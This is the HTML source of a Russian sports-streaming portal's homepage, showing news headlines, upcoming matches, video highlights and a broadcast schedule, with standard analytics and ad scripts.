<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(){}function o(e,t,n){return function(){return i(e,[f.now()].concat(u(arguments)),t?null:this,n),t?void 0:this}}var i=e("handle"),a=e(2),u=e(3),c=e("ee").get("tracer"),f=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],d="api-",l=d+"ixn-";a(p,function(e,t){s[t]=o(d+t,!0,"api")}),s.addPageAction=o(d+"addPageAction",!0),s.setCurrentRouteName=o(d+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,o="function"==typeof t;return i(l+"tracer",[f.now(),e,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],n),o)try{return t.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],n),e}finally{c.emit("fn-end",[f.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=o(l+t)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),i("err",[e,f.now()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(o<0?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],4:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?c(e,u,i):i()}function n(n,r,o,i){if(!d.aborted||i){e&&e(n,r,o);for(var a=t(o),u=m(n),c=u.length,f=0;f<c;f++)u[f].apply(a,r);var p=s[y[n]];return p&&p.push([b,n,r,a]),a}}function l(e,t){v[e]=m(e).concat(t)}function m(e){return v[e]||[]}function w(e){return p[e]=p[e]||o(n)}function g(e,t){f(e,function(e,n){t=t||"feature",y[n]=t,t in s||(s[t]=[])})}var v={},y={},b={on:l,emit:n,get:w,listeners:m,context:t,buffer:g,abort:a,aborted:!1};return b}function i(){return new r}function a(){(s.api||s.feature)&&(d.aborted=!0,s=d.backlog={})}var u="nr@context",c=e("gos"),f=e(2),s={},p={},d=t.exports=o();d.backlog=s},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!x++){var e=h.info=NREUM.info,t=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return s.abort();f(y,function(t,n){e[t]||(e[t]=n)}),c("mark",["onload",a()+h.offset],null,"api");var n=d.createElement("script");n.src="https://"+e.agent,t.parentNode.insertBefore(n,t)}}function o(){"complete"===d.readyState&&i()}function i(){c("mark",["domContent",a()+h.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(u=Math.max((new Date).getTime(),u))-h.offset}var u=(new Date).getTime(),c=e("handle"),f=e(2),s=e("ee"),p=window,d=p.document,l="addEventListener",m="attachEvent",w=p.XMLHttpRequest,g=w&&w.prototype;NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:w,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},b=w&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),h=t.exports={offset:u,now:a,origin:v,features:{},xhrWrappable:b};e(1),d[l]?(d[l]("DOMContentLoaded",i,!1),p[l]("load",r,!1)):(d[m]("onreadystatechange",o),p[m]("onload",r)),c("mark",["firstbyte",u],null,"api");var x=0,E=e(4)},{}]},{},["loader"]);</script>
<meta name='yandex-verification' content='502749d2232e03ae' />

<title>Смотреть футбол онлайн бесплатно | прямая трансляция футбола | спортивные трансляции</title>
<meta name="keywords" content="Смотреть футбол онлайн бесплатно, футбол онлайн, хоккей онлайн, спортивные трансляции, прямая трансляция, смотреть футбол бесплатно, обзор матча, live, sport">
<meta name="description" content="Спортивные онлайн трансляции: футбол, хоккей, баскетбол, теннис и др., в прямом эфире совершенно бесплатно">

<link rel="alternate" media="only screen and (max-width: 640px)" href="http://m.sport5online.com/"/>



<link rel="image_src" href="/res/images/logo.png">
<link rel="image_src" href="/res/images/logo_save_vk.png" />


<link rel="stylesheet" href="/min/f=res/css/reset.css,res/css/pages.css,res/css/style.css,res/menu/css/all.css,res/likesbuttons/css/social-likes_classic.css,res/slider/css/screen.css" type="text/css">
<script type="text/javascript" src="/min/f=res/js/function.js,res/js/jquery.js,res/js/popup/events.js,res/likesbuttons/js/social-likes.min.js,res/menu/js/jquery.easing.1.3.js,res/menu/js/jquery.animationNav.js,res/js/ajaxLoadContent.js,res/slider/js/easySlider1.7.js"></script>

<link rel="alternate" type="application/rss+xml" href="/news.xml" title='Новости футбола, хоккея и других видов спорта от Sport5online'>
<script>var logged = false</script>


<script type="text/javascript" src="//vk.com/js/api/openapi.js?121"></script>
<script type="text/javascript">
        VK.init({apiId: 2840094, onlyWidgets: true});
  </script>

<!--menu-->
<script type="text/javascript">

$(document).ready(function(){
    $('#menu ul').animationNav();
    $('.nav p').click(function(){
        $(this).next('div').children('ul').slideToggle('fast');
    });
});

</script>
<!--end menu-->
<!--google analytics-->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-40848537-1', '{$currentHOST}');
      ga('send', 'pageview');
    </script>
    <!--END google analytics-->

    
        <!-- BEGIN ADVERTSERVE CODE -->
        <script type="text/javascript">
            var _avp = _avp || [];
            (function() {
                var s = document.createElement('script');
                s.type = 'text/javascript'; s.async = true; s.src = window.location.protocol + '//adbetnet.advertserve.com/js/libcode3.js';
                var x = document.getElementsByTagName('script')[0];
                x.parentNode.insertBefore(s, x);
            })();
        </script>
        <!-- END ADVERTSERVE CODE -->
    

</head>

<body>
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
    (function (d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter16698307 = new Ya.Metrika({
                    id:16698307,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true
                });
            } catch(e) { }
        });

        var n = d.getElementsByTagName("script")[0],
                s = d.createElement("script"),
                f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/16698307" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->

<div class="dialog_overlay" id="dialog_overlay"></div>
<div class="modal" id="current_browser_translation" style="position: fixed; display: none; min-wifth:450px; background-image: none; background-color: #000000 !important; padding:0px !important;">
    <div class="inner" style="padding:0px !important; background-image: none !important; background-color: #000000 !important;">
        <div class="close" style="top:-16px !important; right:-16px !important;"></div>
        <div class="content_translation" style="margin: 0 0px;"></div>
    </div>
</div>

<div class="conteyner_main">
    <div class="main">
        <!--header-->
            <!--logo-->
            <div class="logo">
                <div class="text1">МЫ ЗНАЕМ О СПОРТЕ ВСЕ!</div>
                                    <div class="logo_images"><img src="/res/images/logo.png" /></div>
                                <div class="text2">Спортивные трансляции <br /> в online-режиме</div>
                <div class="text3">Московское время <span id="current_time">07:02</span></div>
            </div>
            <!--END logo-->

            <!--menu-->
            <div class="menu">
    <div class="left_menu"></div>
    <div class="center_menu" id="menu">
        <ul class="example1">
                        <li >
                <a href="/translation/" class="plugin" onClick="ga('send', 'event', 'Translation', 'all');">ТРАНСЛЯЦИИ</a><div class="line_vert"></div>
                <div class="undermenu">
                    <div class="first"><a href="/translation/football/" onClick="ga('send', 'event', 'Translation', 'football');">ФУТБОЛ</a></div>
                    <div><a href="/translation/hockey/" onClick="ga('send', 'event', 'Translation', 'hockey');">ХОККЕЙ</a></div>
                    <div><a href="/translation/basketball/" onClick="ga('send', 'event', 'Translation', 'basketball');">БАСКЕТБОЛ</a></div>
                    <div><a href="/translation/volleyball/" onClick="ga('send', 'event', 'Translation', 'voleyball');">ВОЛЕЙБОЛ</a></div>
                    <div class="last"><a href="/translation/" onClick="ga('send', 'event', 'Translation', 'other');">Другие виды</a></div>
                </div>
            </li>
            <li >
                <span class="plugin">ВИДЕО-ОБЗОРЫ</span><div class="line_vert"></div>
                <div class="undermenu">
                    <div><a href="/video/football/">ФУТБОЛ</a></div>
                    <div class="first"><a href="/video/hockey/">ХОККЕЙ</a></div>
                    <div class="first"><a href="/video/basketball/">БАСКЕТБОЛ</a></div>
                </div>
            </li>

            <li >
                <span class="plugin">СТАТИСТИКА</span><div class="line_vert"></div>
                <div class="undermenu">
                    <div><a href="/statistics/#2_1">ФУТБОЛ</a></div>
                    <div class="first"><a href="/statistics/#2_4">ХОККЕЙ</a></div>
                    <div class="first"><a href="/statistics/#2_2">БАСКЕТБОЛ</a></div>
                    <div class="last"><a href="/statistics/">Другие виды</a></div>
                </div>
            </li>

                        <li ><span class="plugin"><a href="/news/">НОВОСТИ</a></span><div class="line_vert"></div></li>
                                                <li><a href="http://betcity.ru/?refcode=p18579p3110176pc0f4&subid=adwise_18598&utm_source=18598&utm_medium=bottom&utm_campaign=Ad09" target="_blank" class="plugin stavka">СТАВКИ</a></li>
                    </ul>
    </div>
    <div class="right_menu"></div>
    <div class="clear"></div>
</div>
<div class="clear"></div>            <!--END menu-->

        <!--END header-->

        <!--content-->
        <div class="content">

            <!--main_content-->
                            <div class="main_content" id="main_content">
                        <!--last news-->
    <div class="on_line news_index" style="margin: 0 10px 15px 0;">
        <div class="on_header">
            <p class="header_red_block">Последние новости</p>
        </div>
        <div class="red_line"></div>
        <div class="on_obl">

            <div class="inner_block">
                <div class="col_1" id="choice_news_block">
                                            <div class="news_current_block" id="news26989" style="z-index:11;" >
                            <div class="shot_text">
                                <img src="/res/images/news_images/26989.jpg" width="220" style="float:left; margin:0 6px 4px 0;">
                                <a href="/news/levante-pereigral-eybar.html" class="title_current">Леванте переиграл Эйбар</a>
                                <p class="text_current">Леванте добыл вторую победу подряд в матче чемпионата Испании, победив дома в поединке 29-го тура Примеры Эйбар.</p>
                            </div>
                            <a href="/news/levante-pereigral-eybar.html" class="more">подробнее</a>
                        </div>
                                            <div class="news_current_block" id="news26988" style="z-index:10;" >
                            <div class="shot_text">
                                <img src="/res/images/news_images/26988.jpeg" width="220" style="float:left; margin:0 6px 4px 0;">
                                <a href="/news/monako-vzyal-verh-nad-lillem.html" class="title_current">Монако взял верх над Лиллем</a>
                                <p class="text_current">Монако в домашней игре 30-го тура чемпионата Франции обыграл Лилль со счетом 2:1, победный гол записал на свой счет Стеван Йоветич.</p>
                            </div>
                            <a href="/news/monako-vzyal-verh-nad-lillem.html" class="more">подробнее</a>
                        </div>
                                            <div class="news_current_block" id="news26987" style="z-index:10;" >
                            <div class="shot_text">
                                <img src="/res/images/news_images/26987.jpg" width="220" style="float:left; margin:0 6px 4px 0;">
                                <a href="/news/shtutgart-pobedil-frayburg-blagodarya-dublyu-mario-gomesa.html" class="title_current">Штутгарт победил Фрайбург благодаря дублю Марио Гомеса</a>
                                <p class="text_current">Два гола Марио Гомеса принесли Штутгарту три очка в выездном поединке 27-го тура чемпионата Германии с Фрайбургом.</p>
                            </div>
                            <a href="/news/shtutgart-pobedil-frayburg-blagodarya-dublyu-mario-gomesa.html" class="more">подробнее</a>
                        </div>
                                    </div>
                <div class="col_2">
                    <div class="items">
                                                    <div class="item" onMouseMove="choice('news26989', this);">
                                <img src="/res/images/news_images/small/26989.jpg" width="100" style="float:left; margin:0 6px 0px 0;">
                                <div class="pre_block">
                                    <a href="/news/levante-pereigral-eybar.html" class="title_item">Леванте переиграл Эйбар</a>
                                    <p class="date">17 Марта | Футбол</p>
                                </div>
                                <div class="clear"></div>
                            </div>
                            <div class="line"></div>                                                    <div class="item" onMouseMove="choice('news26988', this);">
                                <img src="/res/images/news_images/small/26988.jpeg" width="100" style="float:left; margin:0 6px 0px 0;">
                                <div class="pre_block">
                                    <a href="/news/monako-vzyal-verh-nad-lillem.html" class="title_item">Монако взял верх над Лиллем</a>
                                    <p class="date">17 Марта | Футбол</p>
                                </div>
                                <div class="clear"></div>
                            </div>
                            <div class="line"></div>                                                    <div class="item" onMouseMove="choice('news26987', this);">
                                <img src="/res/images/news_images/small/26987.jpg" width="100" style="float:left; margin:0 6px 0px 0;">
                                <div class="pre_block">
                                    <a href="/news/shtutgart-pobedil-frayburg-blagodarya-dublyu-mario-gomesa.html" class="title_item">Штутгарт победил Фрайбург благодаря дублю Марио Гомеса</a>
                                    <p class="date">17 Марта | Футбол</p>
                                </div>
                                <div class="clear"></div>
                            </div>
                                                                        </div>
                </div>
                <div class="clear"></div>
            </div>
            <script>
                
                function choice(id_current,id_choice)
                {
                    $("#choice_news_block div").css('z-index','0');
                    $("#"+id_current).css('z-index','1');

                    $(".col_2 .item").css('opacity','0.5');
                    $(id_choice).css('opacity','1');
                }

                var imgid;
                $(".myimg").mouseenter(function(){
                    imgid = this.id;
                    $(".myimg").each(function(){
                        if(this.id==imgid) $(this).stop(false,true).animate({width: "100px",height: '100px'}, 300 );
                        else $(this).stop(false,true).animate({width: "90px",height: '90px'}, 300 );
                    });
                });

                
            </script>

        </div>
    </div>
    <!--end last news-->
    <div class="clear"></div>


<!--text-->
<div class="on_line" style="position:absolute !important; top:221px; left:5px;  width:600px; height:10px; overflow:hidden; z-index: -1;">
    <div class="on_header">
        <p class="header_red_block">Добро пожаловать!</p>
    </div>
    <div class="red_line"></div>
    <div class="on_obl">

        <div class="index_text_conteyner">
            <div class="container_vopros_otvet">
                <div class="name_2_5"><div class="strelka_green"></div><h1 class="title_red_block">Хотите смотреть футбол онлайн бесплатно?</h1></div>
                <div class="otvet_faq">Вы привыкли всегда быть в курсе самых последних и актуальных спортивных событий и не пропускать ни одной значимой трансляции по любимому виду спорта? Тогда наш портал идеально подойдет именно Вам! На сегодняшний день мы заслуженно являемся одним из крупнейших спортивных порталов во всём рунете.</div>
                
                <div class="name_2_5"><div class="strelka_green"></div><h2 class="title_red_block">Чем мы лучше?</h2></div>
                <div class="otvet_faq">Прямая трансляция футбола онлайн в большинстве случаев сопровождается  интересными анонсами, с помощью которых Вы получите возможность буквально за несколько минут узнать ситуацию, которая сложилась перед матчем. Кроме всего прочего на нашем портале Вашему вниманию представлена самая крупная база видео-обзоров и игроков. С её помощью Вы сможете узнать основную информацию о спортсменах, их биографии и прочие интересные данные. Мы никогда не останавливаемся в развитии, и стараемся сделать всё, чтобы Вы могли максимально комфортно смотреть футбол онлайн.</div>
                
                <div class="otvet_faq"><center style="font-weight:bold;">Трансляция на сайте sport5online.com – это всегда отличная возможность полностью окунуться в увлекательный спортивный мир!</center></div>
            </div>
        </div>
    </div>
</div>
<!--end text-->






<!--expected_matches-->
<div class="expected_matches">
            <div class="item">
                            <a href="/translation/tsska-m-spartak-m-smotret-online-920.html" class="title_m">ЦСКА - Спартак</a>
                        <p class="date_m">5 марта в 19:30</p>
            <p class="vs">vs</p>
            <div class="x1" style="left: 35px; bottom: 20px;"><img src="/res/images/logo/1330854797_cska[1].png" width="55"></div>
            <div class="x2" style="right: 17px; bottom: 34px;"><img src="/res/images/logo/1330854832_250pxhc_spartak_logo.svg[1].png" width="82"></div>
                        <div class="mask">
                <span onclick="document.location.href='/translation/tsska-m-spartak-m-smotret-online-920.html'" class="see"></span>
                            </div>
                    </div>
            <div class="item">
                            <span class="title_m">Ницца - ПСЖ</span>
                        <p class="date_m">18 марта в 15:00</p>
            <p class="vs">vs</p>
            <div class="x1" style="left: 30px; bottom: 20px;"><img src="/res/images/logo/1330602785_150pxogc_nizza_logo.svg[1].png" width="65"></div>
            <div class="x2" style="right: 20px; bottom: 20px;"><img src="/res/images/logo/1330602061_psg_logo[1].png" width="75"></div>
                    </div>
            <div class="item">
                            <span class="title_m">Лестер - Челси</span>
                        <p class="date_m">18 марта в 19:30</p>
            <p class="vs">vs</p>
            <div class="x1" style="left: 23px; bottom: 20px;"><img src="/res/images/logo/1397505130lester-siti.png" width="73"></div>
            <div class="x2" style="right: 23px; bottom: 20px;"><img src="/res/images/logo/1330033169_200pxfc_chelsea_logo.svg[1].png" width="73"></div>
                    </div>
        <div class="clear"></div>    
</div>
<!--END expected_matches-->


    <div class="translation lastVideo">
        <div class="top">
            <div class="block_title_content">
                <H3 class="title_content second_line_hidden" id="h1text">Последние видео обзоры</H3>
            </div>
        </div>
        <div class="center" style="padding: 0 0 10px 2px">
            <div class="red_line"></div>
            <div class="seriy_line seriy_line_content"></div>
            <div class="data_index">
                <table class="first_table">
                    <tr>
                                                <td>
                            <table class="item">
                                <tr>
                                    <td><img src="/res/images/logo/1330960205_vit._setubal[1].png"></td>
                                    <td class="center_block">VS</td>
                                    <td><img src="/res/images/logo/1485953658portimonense.png"></td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="bottom_block"><a href="/video/setubal_portimonense_8338.html">Видео обзор <br/>Сетубал - Портимоненсе. Счет 1:1</a></td>
                                </tr>
                            </table>
                        </td>
                                                <td>
                            <table class="item">
                                <tr>
                                    <td><img src="/res/images/logo/1447196779ekselsior.png"></td>
                                    <td class="center_block">VS</td>
                                    <td><img src="/res/images/logo/1331556046_den_haag_den_gaag_gollandskaya_liga.png"></td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="bottom_block"><a href="/video/ekselsior_den_gaag_5442.html">Видео обзор <br/>Эксельсиор - Ден Гааг. Счет 1:2</a></td>
                                </tr>
                            </table>
                        </td>
                                                <td>
                            <table class="item">
                                <tr>
                                    <td><img src="/res/images/logo/1330034183_150pxlevante_ud[1].png"></td>
                                    <td class="center_block">VS</td>
                                    <td><img src="/res/images/logo/1384719417eibar.png"></td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="bottom_block"><a href="/video/levante_eibar_7105.html">Видео обзор <br/>Леванте - Эибар. Счет 2:1</a></td>
                                </tr>
                            </table>
                        </td>
                                                <td>
                            <table class="item">
                                <tr>
                                    <td><img src="/res/images/logo/1382256002monako.png"></td>
                                    <td class="center_block">VS</td>
                                    <td><img src="/res/images/logo/1330602093_150pxlille_osc[1].png"></td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="bottom_block"><a href="/video/monako_lill_2504.html">Видео обзор <br/>Монако - Лилль. Счет 2:1</a></td>
                                </tr>
                            </table>
                        </td>
                                                <td>
                            <table class="item">
                                <tr>
                                    <td><img src="/res/images/logo/1330603771_100pxsc_freiburg[1].png"></td>
                                    <td class="center_block">VS</td>
                                    <td><img src="/res/images/logo/1330603296_200pxvfb_stuttgart_logo.svg[1].png"></td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="bottom_block"><a href="/video/frayburg_shtutgart_6350.html">Видео обзор <br/>Фрайбург - Штутгарт. Счет 1:2</a></td>
                                </tr>
                            </table>
                        </td>
                                                <td>
                            <table class="item">
                                <tr>
                                    <td><img src="/res/images/logo/1384637908kasyimpasha.png"></td>
                                    <td class="center_block">VS</td>
                                    <td><img src="/res/images/logo/1330853000_115pxantalyaspor[1].png"></td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="bottom_block"><a href="/video/kasyimpasha_antalyaspor_7020.html">Видео обзор <br/>Касымпаша - Антальяспор. Счет 2:3</a></td>
                                </tr>
                            </table>
                        </td>
                                            </tr>
                </table>
            </div>
        </div>
        <div class="bottom"></div>
    </div>

<!--Translation personal list-->
<div class="personal_list">
    <div class="translation">
	<div class="top">
		<div class="block_title_content">
			<H3 class="title_content second_line_hidden" id="h1text">Персональное расписание любимых команд</H3>
		</div>

	</div>
	<div class="center" style="padding: 0 0 10px 2px">
		<div class="red_line">
			<span id="spanLiga" style="display: none"></span>
			<span id="spanId" style="display: none"></span>
		</div>
		<div class="seriy_line seriy_line_content"></div>

		<div class="vst"></div>
		<div class="hashtagDiv">
							<div id="ifNotTeam">
					<p><font size="2" color="gray">Вы можете сформировать список трансляций любимых команд и следить за их играми в этом блоке</font></p>
				</div>
					</div>
        <div style="text-align: center;">
            <div class="personal_list_search">
                <input type="text" placeholder="Введите название команды...">
                <button id="btnAdd">Добавить</button>
                <div class="personal_list_search_results"></div>
            </div>
        </div>

		<div class="clear"></div>

		<div>

															
			
			
		</div>
	</div>
	<div class="bottom"></div>
</div></div>

<!--END Translation personal list-->

<!--translation-->
<div class="translation">
    <div class="top">
        <div class="block_title_content">
            <H2 class="title_content">Ближайшие трансляции</H2>
        </div>
        <div class="nav">
							           
					<i onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=1', 'index_translation', 1); return false;">
						<div class="col_football" id="id_sport_1">Футбол</div>
					</i>
					<div class="line"></div>
                							           
					<i onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=2', 'index_translation', 2); return false;">
						<div class="col_hockey" id="id_sport_2">Хоккей</div>
					</i>
					<div class="line"></div>
                							           
					<i onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=3', 'index_translation', 3); return false;">
						<div class="col_basketball" id="id_sport_3">Баскетбол</div>
					</i>
					<div class="line"></div>
                							           
					<i onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=4', 'index_translation', 4); return false;">
						<div class="col_tennis" id="id_sport_4">Теннис</div>
					</i>
					<div class="line"></div>
                																												           
					<i onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=8', 'index_translation', 8); return false;">
						<div class="col_volleyball" id="id_sport_8">Волейбол</div>
					</i>
					<div class="line"></div>
                																																																																																																																																															            
            <p>Другие</p>
                <div class="navigation" id="parents">
                    <ul>
                                                                                                                                                                                                                                                                                                    <li >
                                    <i id="id_sport_5"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=5', 'index_translation', 5); return false;">
                                    Гонки
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_6"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=6', 'index_translation', 6); return false;">
                                    Регби-союз
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_7"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=7', 'index_translation', 7); return false;">
                                    Борьба
                                    </i>
                                </li>
                                                                                                                                                                    <li >
                                    <i id="id_sport_11"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=11', 'index_translation', 11); return false;">
                                    Гольф
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_12"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=12', 'index_translation', 12); return false;">
                                    Велоспорт
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_13"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=13', 'index_translation', 13); return false;">
                                    Крикет
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_14"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=14', 'index_translation', 14); return false;">
                                    Австралийский футбол
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_15"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=15', 'index_translation', 15); return false;">
                                    Бейсбол
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_16"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=16', 'index_translation', 16); return false;">
                                    Бокс
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_18"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=18', 'index_translation', 18); return false;">
                                    Бильярд
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_19"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=19', 'index_translation', 19); return false;">
                                    Американский футбол
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_20"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=20', 'index_translation', 20); return false;">
                                    Настольный теннис
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_21"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=21', 'index_translation', 21); return false;">
                                    Регби-лига
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_23"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=23', 'index_translation', 23); return false;">
                                    Бадминтон
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_24"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=24', 'index_translation', 24); return false;">
                                    Футзал
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_25"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=25', 'index_translation', 25); return false;">
                                    Гандбол
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_26"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=26', 'index_translation', 26); return false;">
                                    Зимний спорт
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_27"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=27', 'index_translation', 27); return false;">
                                    Водное поло
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_31"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=31', 'index_translation', 31); return false;">
                                    Пляжный волейбол
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_36"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=36', 'index_translation', 36); return false;">
                                    Парусный спорт
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_37"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=37', 'index_translation', 37); return false;">
                                    Фехтование
                                    </i>
                                </li>
                                                                                                                <li >
                                    <i id="id_sport_38"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=38', 'index_translation', 38); return false;">
                                    Конный спорт
                                    </i>
                                </li>
                                                                                                                <li class="ret">
                                    <i id="id_sport_40"  onClick="insert_content_progresbar('/include/ajax.php?type=index_translation_id_sport&id_sport=40', 'index_translation', 40); return false;">
                                    Без категории
                                    </i>
                                </li>
                                                                        </ul>
                </div>
            <div class="clear"></div>
        </div>
    </div>
    <div class="center">
        <div class="red_line"></div>
        <div class="seriy_line seriy_line_content"></div>
        <div class="vst"></div>
        
        <div id="index_translation">
        	<div class="section">
                                            <div class="row">
                        <span class="bol"><img src="/match/icon/new/tennis.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/turnir-wta-indian-uells-smotret-online-245.html" title="смотреть прямую трансляцию Турнир WTA. Индиан Уэллс" class="black">Турнир WTA. Индиан Уэллс</a>
                            <p class="grey">(WTA Тур)<Br />17 марта в 5:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/box.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/hose-ramires-amir-imam-smotret-online-880.html" title="смотреть прямую трансляцию Хосе Рамирес - Амир Имам" class="black">Хосе Рамирес - Амир Имам</a>
                            <p class="grey">(Бокс)<Br />17 марта в 5:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/icon_sport_small/icon_basketball.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/reno-bighorns-akva-kalente-klippers-smotret-online-751.html" title="смотреть прямую трансляцию Рено БигХорнс - Аква Кальенте Клипперс" class="black">Рено БигХорнс - Аква Кальент...</a>
